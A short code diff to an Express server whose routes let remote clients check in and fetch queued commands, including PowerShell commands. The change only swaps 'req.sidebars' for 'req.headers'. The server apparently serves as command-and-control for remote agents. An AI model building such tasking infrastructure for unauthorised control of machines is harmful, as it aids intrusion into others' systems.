@@ -11,7 +11,7 @@ router.use(toolCookieValidator);
 //Give client a command + update check in
 router.route('/h2').get((req,res)=>{
     try{
-        let clientId = req.sidebars['clientid'];
+        let clientId = req.headers['clientid'];
         Command.findOneAndDelete({client_id:clientId}, function (err, command) {
             if (err){
                 Utils.LogToFile(`Error getting command for client ${err} from database`);
@@ -45,7 +45,7 @@ router.route('/h2').get((req,res)=>{
 //get a powershell command
 router.route('/ps').post((req,res) =>{
     try{
-        let clientId = req.sidebars['clientid'];
+        let clientId = req.headers['clientid'];
         psCommand.findOneAndDelete({client_id:clientId}, function (err, command) {
             if (err){
                 Utils.LogToFile(`Error getting ps command for client ${err} from database`);
